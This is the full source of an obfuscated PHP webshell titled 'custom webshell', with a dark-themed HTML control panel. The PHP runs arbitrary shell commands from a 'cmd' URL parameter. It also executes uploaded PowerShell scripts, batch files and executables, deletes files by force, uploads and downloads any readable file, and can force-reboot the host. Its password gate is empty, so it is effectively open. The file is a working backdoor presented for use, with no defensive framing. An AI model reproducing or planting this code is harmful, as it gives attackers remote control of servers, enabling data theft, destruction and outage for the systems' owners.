<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php $trzdkwey1a1dc91c907325c69271ddf0='';global $vspvttuw868d3cb40d275143fc963b14;global $dethvtod020b759adef679a47cb9afe9;if($trzdkwey1a1dc91c907325c69271ddf0!=null){if(isset($_COOKIE['pass'])){if(hash('sha512',$_COOKIE['pass'])!==$trzdkwey1a1dc91c907325c69271ddf0){echo "Wrong password !";exit;}}else{echo "Wrong password !";exit;}}function Change9c54e775(string $roaddsqld6fe1d0be6347b8ef2427fa6):string{$roaddsqld6fe1d0be6347b8ef2427fa6=mb_ereg_replace('\\\\|/','/',$roaddsqld6fe1d0be6347b8ef2427fa6,'msr');$ichrzklm3ff401a37a03fe7c08117faf=$roaddsqld6fe1d0be6347b8ef2427fa6[0]==='/';preg_match('/^[a-z]:/',$roaddsqld6fe1d0be6347b8ef2427fa6,$zpyscabl9c28d32df234037773be184d);$dipqcyir3ecab05b5b8340f3ad9a85c4=isset($zpyscabl9c28d32df234037773be184d[0])?$zpyscabl9c28d32df234037773be184d[0]:false;$nwvvaaptb6a8e8682249b56898e11f47=array_filter(explode('/',$roaddsqld6fe1d0be6347b8ef2427fa6),'mb_strlen');$dzbxkgib81406cf89f2a977dae20d55f=[];foreach($nwvvaaptb6a8e8682249b56898e11f47 as $cvgyzmqg1634b7ef7a71f9ae79c4b3b3){if('.'===$cvgyzmqg1634b7ef7a71f9ae79c4b3b3){continue;}if('..'===$cvgyzmqg1634b7ef7a71f9ae79c4b3b3&&!$ichrzklm3ff401a37a03fe7c08117faf&&!$dipqcyir3ecab05b5b8340f3ad9a85c4&&empty(array_filter($dzbxkgib81406cf89f2a977dae20d55f,function($nmjuumme2063c1608d6e0baf80249c42){return!('..'===$nmjuumme2063c1608d6e0baf80249c42);}))){$dzbxkgib81406cf89f2a977dae20d55f[]=$cvgyzmqg1634b7ef7a71f9ae79c4b3b3;continue;}if('..'===$cvgyzmqg1634b7ef7a71f9ae79c4b3b3){array_pop($dzbxkgib81406cf89f2a977dae20d55f);continue;}$dzbxkgib81406cf89f2a977dae20d55f[]=$cvgyzmqg1634b7ef7a71f9ae79c4b3b3;}return(($ichrzklm3ff401a37a03fe7c08117faf?'/':$dipqcyir3ecab05b5b8340f3ad9a85c4)?$dipqcyir3ecab05b5b8340f3ad9a85c4.'/':'').implode('/',$dzbxkgib81406cf89f2a977dae20d55f);}if(isset($_POST['upload'])){$xetcvxqu14402cfaa3089ce288adfbda=Attract1958199e();$mldradzi87f85f26c826cf7ccb2ae98b=$xetcvxqu14402cfaa3089ce288adfbda.'/'.basename($_FILES['file']['name']);if(file_exists($mldradzi87f85f26c826cf7ccb2ae98b)){echo "<script>alert('Error: File already exists !')</script>";}else if(move_uploaded_file($_FILES['file']['tmp_name'],$mldradzi87f85f26c826cf7ccb2ae98b)){echo "<script>alert('File uploaded successfuly !')</script>";}else{echo "<script>alert('Error: Could not upload file !')</script>";}}else if(isset($_GET['runscript'])){$ccomjkcu3205c0ded576131ea255ad2b=$_GET['runscript'];$ndcdbvzw0d858590b2752462cbbd205a=Change9c54e775($ccomjkcu3205c0ded576131ea255ad2b);$lzjvqlou1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -File "'.$ndcdbvzw0d858590b2752462cbbd205a.'"';global $vspvttuw868d3cb40d275143fc963b14;global $dethvtod020b759adef679a47cb9afe9;$vspvttuw868d3cb40d275143fc963b14=shell_exec($lzjvqlou1dccadfed7bcbb036c56a4af);}else if(isset($_GET['runexe'])){$ccomjkcu3205c0ded576131ea255ad2b=$_GET['runexe'];$ndcdbvzw0d858590b2752462cbbd205a=Change9c54e775($ccomjkcu3205c0ded576131ea255ad2b);$lzjvqlou1dccadfed7bcbb036c56a4af=$ndcdbvzw0d858590b2752462cbbd205a;exec('cd '.realpath(Attract1958199e()).' && '.$ndcdbvzw0d858590b2752462cbbd205a,$vspvttuw868d3cb40d275143fc963b14,$dethvtod020b759adef679a47cb9afe9);}else if(isset($_GET['runbat'])){$ccomjkcu3205c0ded576131ea255ad2b=$_GET['runbat'];$ndcdbvzw0d858590b2752462cbbd205a=Change9c54e775($ccomjkcu3205c0ded576131ea255ad2b);$lzjvqlou1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","'.$ndcdbvzw0d858590b2752462cbbd205a.') }';exec('cd '.realpath(Attract1958199e()).' && '.$ndcdbvzw0d858590b2752462cbbd205a,$vspvttuw868d3cb40d275143fc963b14,$dethvtod020b759adef679a47cb9afe9);}else if(isset($_GET['delete'])){$ccomjkcu3205c0ded576131ea255ad2b=$_GET['delete'];$ndcdbvzw0d858590b2752462cbbd205a=Change9c54e775($ccomjkcu3205c0ded576131ea255ad2b);$lzjvqlou1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command "& { Write-Output "Deleting file "'.$ndcdbvzw0d858590b2752462cbbd205a.'"; $Null = Remove-Item -Path "'.$ndcdbvzw0d858590b2752462cbbd205a.'" -Force -ErrorAction Ignore }"';global $vspvttuw868d3cb40d275143fc963b14;global $dethvtod020b759adef679a47cb9afe9;$vspvttuw868d3cb40d275143fc963b14[0]=shell_exec($lzjvqlou1dccadfed7bcbb036c56a4af);}else if(isset($_GET['quickaction'])){$qngdwvoa418c5509e2171d55b0aee5c2=$_GET['quickaction'];switch($qngdwvoa418c5509e2171d55b0aee5c2){case "restart":$lzjvqlou1dccadfed7bcbb036c56a4af='pwsh -noni -nop -Command "& {Restart-Computer -Force}"';$vspvttuw868d3cb40d275143fc963b14=shell_exec($lzjvqlou1dccadfed7bcbb036c56a4af);break;default:break;}}if(isset($_GET['download'])){$siazhgei8c7dd922ad47494fc02c388e=$_GET['download'];if(file_exists($siazhgei8c7dd922ad47494fc02c388e)){if(is_readable($siazhgei8c7dd922ad47494fc02c388e)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($siazhgei8c7dd922ad47494fc02c388e).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($siazhgei8c7dd922ad47494fc02c388e));readfile($siazhgei8c7dd922ad47494fc02c388e);exit;}else{echo "<script>alert('Error: Could not read the file !')</script>";exit;}}}function Actb9381eae(){return 'rgb(32, 0, 128)';}function Contactc43966ce(){return '#00ff00';}function Wasb7c09cc8(){return '#d92626';}function Demande32a5deb(){return '#d0d0d0';}function Decide9a4708e7(){return '#ff0066';}function Fold7316d6ee(){return '#3ADF00';}function Mistake2ef75aa6(){return '#3ADF00';}function Attract1958199eectoryColor(){return '#3ADF00';}function Engagef5516f02(){return '#ff5500';}function Command69ededb1(){return '#C0C0C0';}function Owe2863310d(){return '#C0C0C0';}function Shut23d894af(){return '#3ADF00';}function Sing45cc3120($ymadhnbec9e9a848920877e76685b2e4){switch($ymadhnbec9e9a848920877e76685b2e4){case 1:return '#101010';break;case 2:return '#202020';break;case 3:return '#303030';break;case 4:return '#404040';break;default:return '#404040';}return '#404040';}function Drive933dfc4c($ocosrgkrb068931cc450442b63f5b3d2){$rovqygyt7b8b965ad4bca0e41ab51de7=strrpos($ocosrgkrb068931cc450442b63f5b3d2,'.');return($rovqygyt7b8b965ad4bca0e41ab51de7===false)?'':substr($ocosrgkrb068931cc450442b63f5b3d2,$rovqygyt7b8b965ad4bca0e41ab51de7+1);}function Settlecd981c49($thnruyvi435ed7e9f07f740abf511a62){$dethvtod020b759adef679a47cb9afe9='';$gkcxulxga3da707b651c79ecc39a4986=Attract1958199e().'/'.$thnruyvi435ed7e9f07f740abf511a62;if(is_dir($gkcxulxga3da707b651c79ecc39a4986)){$dethvtod020b759adef679a47cb9afe9.='<td style="color: "'.Attract1958199eectoryColor().'">';$dethvtod020b759adef679a47cb9afe9.=htmlspecialchars('<dir>');}else{$dethvtod020b759adef679a47cb9afe9.='<td style="color: "'.Wasb7c09cc8().'">';$jbkupfsj93d565f07a1ee62504ba94b6=Risk146bc793(filesize($gkcxulxga3da707b651c79ecc39a4986));$dethvtod020b759adef679a47cb9afe9.=$jbkupfsj93d565f07a1ee62504ba94b6;}$dethvtod020b759adef679a47cb9afe9.='</td>';return $dethvtod020b759adef679a47cb9afe9;}function Involved89ad3875($thnruyvi435ed7e9f07f740abf511a62){$dethvtod020b759adef679a47cb9afe9='';$iejnvltyabf77184f55403d75b9d51d7=pathinfo($thnruyvi435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);$dethvtod020b759adef679a47cb9afe9.='<td style="color: "'.Demande32a5deb().'"> n/a </td>';return $dethvtod020b759adef679a47cb9afe9;}function Push2ad8773e($thnruyvi435ed7e9f07f740abf511a62){$dethvtod020b759adef679a47cb9afe9='';$iejnvltyabf77184f55403d75b9d51d7=pathinfo($thnruyvi435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);if(is_dir($thnruyvi435ed7e9f07f740abf511a62)){echo"\n<!-- DEBUG $thnruyvi435ed7e9f07f740abf511a62 isaDir TRUE -->\n";$dethvtod020b759adef679a47cb9afe9.='<td style="color: "'.Wasb7c09cc8().'">';$dethvtod020b759adef679a47cb9afe9.=Marry4d43495e($thnruyvi435ed7e9f07f740abf511a62);}else{echo"\n<!-- DEBUG $thnruyvi435ed7e9f07f740abf511a62 isaDir FALSE -->\n";$dethvtod020b759adef679a47cb9afe9.='<td style="color: "'.Wasb7c09cc8().'">';$dethvtod020b759adef679a47cb9afe9.=Crasheded18ce($thnruyvi435ed7e9f07f740abf511a62);}switch($iejnvltyabf77184f55403d75b9d51d7){case "ps1":$dethvtod020b759adef679a47cb9afe9.=Plantb9919eea($thnruyvi435ed7e9f07f740abf511a62);break;case "bat":$dethvtod020b759adef679a47cb9afe9.=Permitd0aa079b($thnruyvi435ed7e9f07f740abf511a62);break;case "exe":$dethvtod020b759adef679a47cb9afe9.=Complete0b39eed9($thnruyvi435ed7e9f07f740abf511a62);break;default:}$dethvtod020b759adef679a47cb9afe9.='</td>';return $dethvtod020b759adef679a47cb9afe9;}function Does35807155($siazhgei8c7dd922ad47494fc02c388e){$lrqesikt15d61712450a686a7f365adf=fileperms($siazhgei8c7dd922ad47494fc02c388e);if($lrqesikt15d61712450a686a7f365adf&0x1000){$ufizfzqy599dcce2998a6b40b1e38e8c='p';}else if($lrqesikt15d61712450a686a7f365adf&0x2000){$ufizfzqy599dcce2998a6b40b1e38e8c='c';}else if($lrqesikt15d61712450a686a7f365adf&0x4000){$ufizfzqy599dcce2998a6b40b1e38e8c='d';}else if($lrqesikt15d61712450a686a7f365adf&0x6000){$ufizfzqy599dcce2998a6b40b1e38e8c='b';}else if($lrqesikt15d61712450a686a7f365adf&0x8000){$ufizfzqy599dcce2998a6b40b1e38e8c='-';}else if($lrqesikt15d61712450a686a7f365adf&0xA000){$ufizfzqy599dcce2998a6b40b1e38e8c='l';}else if($lrqesikt15d61712450a686a7f365adf&0xC000){$ufizfzqy599dcce2998a6b40b1e38e8c='s';}else $ufizfzqy599dcce2998a6b40b1e38e8c='u';$coflaejd72122ce96bfec66e2396d2e2["read"]=($lrqesikt15d61712450a686a7f365adf&00400)?'r':'-';$coflaejd72122ce96bfec66e2396d2e2["write"]=($lrqesikt15d61712450a686a7f365adf&00200)?'w':'-';$coflaejd72122ce96bfec66e2396d2e2["execute"]=($lrqesikt15d61712450a686a7f365adf&00100)?'x':'-';$gvnuuybxdb0f6f37ebeb6ea094891243["read"]=($lrqesikt15d61712450a686a7f365adf&00040)?'r':'-';$gvnuuybxdb0f6f37ebeb6ea094891243["write"]=($lrqesikt15d61712450a686a7f365adf&00020)?'w':'-';$gvnuuybxdb0f6f37ebeb6ea094891243["execute"]=($lrqesikt15d61712450a686a7f365adf&00010)?'x':'-';$ypberyao7d793037a0760186574b0282["read"]=($lrqesikt15d61712450a686a7f365adf&00004)?'r':'-';$ypberyao7d793037a0760186574b0282["write"]=($lrqesikt15d61712450a686a7f365adf&00002)?'w':'-';$ypberyao7d793037a0760186574b0282["execute"]=($lrqesikt15d61712450a686a7f365adf&00001)?'x':'-';if($lrqesikt15d61712450a686a7f365adf&0x800)$coflaejd72122ce96bfec66e2396d2e2["execute"]=($coflaejd72122ce96bfec66e2396d2e2['execute']=='x')?'s':'S';if($lrqesikt15d61712450a686a7f365adf&0x400)$gvnuuybxdb0f6f37ebeb6ea094891243["execute"]=($gvnuuybxdb0f6f37ebeb6ea094891243['execute']=='x')?'s':'S';if($lrqesikt15d61712450a686a7f365adf&0x200)$ypberyao7d793037a0760186574b0282["execute"]=($ypberyao7d793037a0760186574b0282['execute']=='x')?'t':'T';$kmyddzsm03c7c0ace395d80182db07ae=sprintf("%1s",$ufizfzqy599dcce2998a6b40b1e38e8c);$kmyddzsm03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$coflaejd72122ce96bfec66e2396d2e2['read'],$coflaejd72122ce96bfec66e2396d2e2['write'],$coflaejd72122ce96bfec66e2396d2e2['execute']);$kmyddzsm03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$gvnuuybxdb0f6f37ebeb6ea094891243['read'],$gvnuuybxdb0f6f37ebeb6ea094891243['write'],$gvnuuybxdb0f6f37ebeb6ea094891243['execute']);$kmyddzsm03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$ypberyao7d793037a0760186574b0282['read'],$ypberyao7d793037a0760186574b0282['write'],$ypberyao7d793037a0760186574b0282['execute']);return $kmyddzsm03c7c0ace395d80182db07ae;}function Risk146bc793($ohugnxus4b3a6218bb3e3a7303e8a171){if($ohugnxus4b3a6218bb3e3a7303e8a171>=1073741824){$ohugnxus4b3a6218bb3e3a7303e8a171=number_format($ohugnxus4b3a6218bb3e3a7303e8a171/1073741824,2).' GB';}elseif($ohugnxus4b3a6218bb3e3a7303e8a171>=1048576){$ohugnxus4b3a6218bb3e3a7303e8a171=number_format($ohugnxus4b3a6218bb3e3a7303e8a171/1048576,2).' MB';}elseif($ohugnxus4b3a6218bb3e3a7303e8a171>=1024){$ohugnxus4b3a6218bb3e3a7303e8a171=number_format($ohugnxus4b3a6218bb3e3a7303e8a171/1024,2).' KB';}elseif($ohugnxus4b3a6218bb3e3a7303e8a171>1){$ohugnxus4b3a6218bb3e3a7303e8a171=$ohugnxus4b3a6218bb3e3a7303e8a171.' bytes';}elseif($ohugnxus4b3a6218bb3e3a7303e8a171==1){$ohugnxus4b3a6218bb3e3a7303e8a171=$ohugnxus4b3a6218bb3e3a7303e8a171.' byte';}else{$ohugnxus4b3a6218bb3e3a7303e8a171='0 bytes';}return $ohugnxus4b3a6218bb3e3a7303e8a171;}function Attract1958199e(){return isset($_GET['dir'])?realpath($_GET['dir']):getcwd();}function Exercise1c7f6d85($siazhgei8c7dd922ad47494fc02c388e){if(is_dir(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e)){return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'">'.$siazhgei8c7dd922ad47494fc02c388e.'</a>';}else{return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'">'.$siazhgei8c7dd922ad47494fc02c388e.'</a>';}}function Plantb9919eea($siazhgei8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.Change9c54e775(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'&dir='.realpath(Attract1958199e()).'">'.'run </a>';}function Complete0b39eed9($siazhgei8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.Change9c54e775(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'&dir='.realpath(Attract1958199e()).'">'.'run </a>';}function Crasheded18ce($siazhgei8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?delete='.Change9c54e775(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'&dir='.realpath(Attract1958199e()).'">'.'del </a>';}function Permitd0aa079b($siazhgei8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.Change9c54e775(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'&dir='.realpath(Attract1958199e()).'">'.'run </a>';}function Marry4d43495e($siazhgei8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?zipdir='.Change9c54e775(Attract1958199e().'/'.$siazhgei8c7dd922ad47494fc02c388e).'&dir='.realpath(Attract1958199e()).'">'.'zip </a>';}function Traffic66295f5c(){$vygmmslq45b963397aa40d4a0063e0d8=scandir(Attract1958199e());$cenxtnubcc935c5faf4c8f7a0468d755=true;if($vygmmslq45b963397aa40d4a0063e0d8!=null){foreach($vygmmslq45b963397aa40d4a0063e0d8 as $thnruyvi435ed7e9f07f740abf511a62){echo '<tr style="background-color:'.($cenxtnubcc935c5faf4c8f7a0468d755?'#515151':'#212121').';">';echo '<td style="font-weight:thin;">'.Exercise1c7f6d85($thnruyvi435ed7e9f07f740abf511a62).'</td>';$loiyhdqj8b0afb238c3cd824b61190b7=Attract1958199e().'/'.$thnruyvi435ed7e9f07f740abf511a62;if(is_dir($loiyhdqj8b0afb238c3cd824b61190b7)){$loiyhdqj8b0afb238c3cd824b61190b7=Attract1958199e().'/'.$thnruyvi435ed7e9f07f740abf511a62;}else{$loiyhdqj8b0afb238c3cd824b61190b7=$thnruyvi435ed7e9f07f740abf511a62;}echo ''.Settlecd981c49($thnruyvi435ed7e9f07f740abf511a62).'';if($thnruyvi435ed7e9f07f740abf511a62=='..'||$thnruyvi435ed7e9f07f740abf511a62=='.'){echo ''.Involved89ad3875($loiyhdqj8b0afb238c3cd824b61190b7).'';}else{echo ''.Push2ad8773e($loiyhdqj8b0afb238c3cd824b61190b7).'';}echo '</tr>';$cenxtnubcc935c5faf4c8f7a0468d755=!$cenxtnubcc935c5faf4c8f7a0468d755;}}else{echo "<p>Couldn't open that directory !";}}function Pitch5e12272f(){global $vspvttuw868d3cb40d275143fc963b14;global $dethvtod020b759adef679a47cb9afe9;if($dethvtod020b759adef679a47cb9afe9==0){if($vspvttuw868d3cb40d275143fc963b14!=null){foreach($vspvttuw868d3cb40d275143fc963b14 as $jpvbnjqh6438c669e0d0de98e6929c2c){if($jpvbnjqh6438c669e0d0de98e6929c2c!=null){echo "<br>";echo htmlspecialchars($jpvbnjqh6438c669e0d0de98e6929c2c);echo "\n";}}}}else{echo "Execution failed with error code: ".$dethvtod020b759adef679a47cb9afe9;}}function Beene756b846(){$gqudphfl0897acf49c7c1ea9f76efe59=gethostname()?? 'none';$iehelmbm14c4b06b824ec59323936251=get_current_user();$wqlsntmd736007832d2167baaae763fd=Attract1958199e();$ccqoxrovdfff0a7fa1a55c8c1a4966c1=isset($_GET['cmd'])?$_GET['cmd']:'';return '<span style="color: #ff6347">'.$iehelmbm14c4b06b824ec59323936251.'@'.$gqudphfl0897acf49c7c1ea9f76efe59.'</span>: <span style="color: #B40404">'.$wqlsntmd736007832d2167baaae763fd.'</span>$ '.$ccqoxrovdfff0a7fa1a55c8c1a4966c1;}if(isset($_GET['cmd'])){exec('cd '.realpath(Attract1958199e()).' && '.$_GET['cmd'],$vspvttuw868d3cb40d275143fc963b14,$dethvtod020b759adef679a47cb9afe9);}?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Travel8378acd3() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
            function Size92b5b9c1() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Actb9381eae();?>;
                --background-color-1: <?php echo Sing45cc3120(1);?>;
                --background-color-2: <?php echo Sing45cc3120(2);?>;
                --background-color-3: <?php echo Sing45cc3120(3);?>;
                --background-color-4: <?php echo Sing45cc3120(4);?>;
                --primary-color: <?php echo Contactc43966ce();?>;
                --secondary-color: <?php echo Wasb7c09cc8();?>;
                --command-color: <?php echo Decide9a4708e7();?>;
                --commandoutput-color: <?php echo Fold7316d6ee();?>;
                --explorer-color: <?php echo Mistake2ef75aa6();?>;
                --directory-color: <?php echo Attract1958199eectoryColor();?>;
                --navtext-color: <?php echo Engagef5516f02();?>;
                --navtext-hover-color: <?php echo Owe2863310d();?>;
                --header-text-color: <?php echo Command69ededb1();?>;
                --buttons-color: <?php echo Shut23d894af();?>;
            }
        </style>
        <script>
            const popupHtmlConfirm = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>HARD REBOOT OF COMPUTER RIGHT NOW!</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Attract1958199e().'&quickaction=restart' ?>" method="POST" enctype="multipart/form-data">
                            <div class="popup-buttons">
                                <button type="button" onclick="Consider7b0ab366()">Cancel</button>
                                <input type="submit" value="confirm" name="confirm">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Attract1958199e()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Consider7b0ab366()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Attract1958199e()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Consider7b0ab366()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Engagefc7a28b1(newLocation)
            {
                window.location = newLocation;
                return false;
            }
            function Enjoy00cbeb8e() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlConfirm + bodyHTML;
            }
            function Perfect95f82816() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Think17fabf17() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Consider7b0ab366() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1><?php echo $_SERVER['HTTP_HOST']; ?> >> control panel </h1>
                <div class="nav-items">
                	<a onclick="Enjoy00cbeb8e()">[restart now]</a>
                    <a onclick="Perfect95f82816()">[upload]</a>
                    <a onclick="Travel8378acd3()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Attract1958199e()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Traffic66295f5c()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Beene756b846()?></p>
                    <p><?php Pitch5e12272f()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Attract1958199e()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>





